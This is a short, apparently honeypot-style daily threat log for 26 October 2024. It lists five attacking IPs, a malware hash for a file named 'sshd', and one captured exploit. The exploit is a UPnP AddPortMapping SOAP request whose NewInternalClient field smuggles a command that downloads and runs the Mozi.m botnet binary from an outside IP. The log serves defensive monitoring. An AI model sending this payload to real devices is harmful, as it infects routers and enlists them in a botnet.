2024/10/26-10-2024

Top 5 IPs for 26-10-2024 :

45.168.176.34
175.205.191.27
164.92.183.148
140.246.92.156
50.169.27.66

Malware Observed:

File name : sshd
f64e9bd0892ef268251bdad87213800dce1ab59f87bb6598a5fb21992e152816
https://www.virustotal.com/gui/file/f64e9bd0892ef268251bdad87213800dce1ab59f87bb6598a5fb21992e152816
 
Commands/exploits observed :

POST /picsdesc.xml HTTP/1.1
Content-Length: 630
Accept-Encoding: gzip, deflate
SOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping
Accept: /
User-Agent: Hello-World
Connection: keep-alive

<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope//" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>cd /var/; wget http://94.50.253.77:38646/Mozi.m; chmod +x Mozi.m; ./Mozi.m</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>
